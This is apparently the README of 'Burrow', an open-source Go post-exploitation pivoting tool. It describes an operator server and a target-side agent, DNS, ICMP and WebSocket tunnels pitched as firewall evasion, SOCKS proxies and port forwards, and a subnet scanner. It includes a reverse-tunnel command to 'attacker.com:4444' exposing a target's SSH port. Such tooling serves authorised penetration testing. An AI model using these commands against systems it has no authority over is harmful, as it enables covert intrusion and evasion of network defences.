# Burrow

Multi-transport pivot tool for post-exploitation network traversal. v3.0.0.

## Overview

Burrow is a static Go binary for post-exploitation network traversal. v3 introduces a pluggable transport architecture: any tunnel (SOCKS5, relay, pivot chain) runs over any transport (Raw TCP/TLS, WebSocket, DNS tunnel, ICMP tunnel). Non-root mode routes sessions through SOCKS5 instead of TUN. Includes a socat-style relay subcommand.

All tunnel traffic is encrypted with X25519 key exchange and ChaCha20-Poly1305 or AES-256-GCM. Agent connections use TLS with certificate fingerprint verification.

## Install / Build

Requires Go 1.24+. Pre-built binaries for 5 platforms are in `build/`.

```bash
# Use pre-built binary
./build/burrow-linux-amd64 --help

# Build for current platform
make build          # -> build/burrow

# Cross-compile all platforms
make build-all
```

### Pre-compiled Binaries

| File | Platform |
|------|----------|
| `build/burrow-linux-amd64` | Linux x86_64 |
| `build/burrow-linux-arm64` | Linux ARM64 |
| `build/burrow-windows-amd64.exe` | Windows x86_64 |
| `build/burrow-darwin-amd64` | macOS Intel |
| `build/burrow-darwin-arm64` | macOS Apple Silicon |

## Transports

Select transport with `--transport <name>` on both server and agent.

| Transport | Flag | Notes |
|-----------|------|-------|
| Raw TCP/TLS | `raw` | Default. TLS with cert fingerprint verification. |
| WebSocket | `ws` | HTTP/HTTPS upgrade. Firewall evasion. |
| DNS tunnel | `dns` | Encodes traffic in DNS queries/responses. |
| ICMP tunnel | `icmp` | Encodes traffic in ICMP echo payloads. |

## Usage

### Server (operator side)

```bash
burrow server                                          # Raw TCP, auto-TLS
burrow server --listen 0.0.0.0:11601 --transport ws   # WebSocket
burrow server --listen 0.0.0.0:53 --transport dns     # DNS tunnel
burrow server --listen 0.0.0.0:0 --transport icmp     # ICMP tunnel
burrow server --webui                                  # Enable WebUI dashboard
```

### Agent (target side)

```bash
burrow agent --server 10.0.0.1:11601
burrow agent --server 10.0.0.1:11601 --transport ws
burrow agent --server 10.0.0.1:11601 --transport dns
burrow agent --server 10.0.0.1:11601 --transport icmp
burrow agent --server 10.0.0.1:11601 --fingerprint SHA256:abc123...
```

### Relay (socat-style)

```bash
burrow relay tcp:0.0.0.0:8080 tcp:10.0.0.5:80
burrow relay tcp:0.0.0.0:8080 ws:10.0.0.5:443
burrow relay stdio tcp:10.0.0.5:4444
```

### Session Management

```bash
burrow session list
burrow session info <id>
burrow session use <id>
```

### Standalone Tools (v1 features)

```bash
# SOCKS5 proxy
burrow proxy socks5 --listen 127.0.0.1:1080
burrow proxy socks5 --listen 0.0.0.0:9050 --auth user:pass

# Local port forward
burrow tunnel local --listen 127.0.0.1:8080 --remote 10.0.0.5:80

# Remote port forward
burrow tunnel remote --listen 0.0.0.0:9090 --remote 192.168.1.10:22

# Reverse tunnel with auto-reconnect
burrow tunnel reverse --connect attacker.com:4444 --forward 127.0.0.1:22

# Multi-hop pivot chain
burrow pivot --target 10.0.0.1 --port 8443

# Network discovery
burrow scan --subnet 10.0.0.0/24
```

## Testing

```bash
~/go1.24/go/bin/go test ./...
```

20 packages, all passing.

## Architecture

```
cmd/burrow/cmd/          CLI (cobra) -- server, agent, relay, session, proxy, tunnel, scan
internal/
  transport/             Transport interface + registry
    raw/                 Raw TCP with TLS
    ws/                  WebSocket (nhooyr.io/websocket)
    dns/                 DNS tunnel
    icmp/                ICMP tunnel
  crypto/                X25519 ECDH + ChaCha20-Poly1305/AES-256-GCM frame encryption
  proxy/                 SOCKS5 server (RFC 1928) + session routing (non-root mode)
  tunnel/                Local, remote, and reverse TCP forwarders
  relay/                 Socat-style bidirectional relay
  pivot/                 Multi-hop chain orchestration
  discovery/             Ping sweep + port scanner
  certgen/               Self-signed TLS cert generation (Ed25519) + SHA256 fingerprint
  mux/                   yamux stream multiplexer for agent sessions
  protocol/              Binary message protocol (12 types, JSON payloads, 1MB max)
  session/               Agent session manager + proxy server + web.SessionProvider
  tun/                   TUN interface with magic IP 240.0.0.0/4 routing (root mode)
  netstack/              gvisor userspace TCP/IP for agent-side packet termination
  web/                   Embedded WebUI (Alpine.js + Pico CSS) with REST API + SSE
```

See ARCHITECTURE.md for detailed data flow and design decisions.

## Tech Stack

- Go 1.24+
- github.com/spf13/cobra (CLI)
- golang.org/x/crypto (X25519, ChaCha20-Poly1305, HKDF)
- github.com/hashicorp/yamux (stream multiplexing)
- nhooyr.io/websocket (WebSocket transport)
- github.com/songgao/water (TUN interface)
- github.com/nicocha30/gvisor-ligolo (userspace TCP/IP netstack)
- Module: github.com/loudmumble/burrow
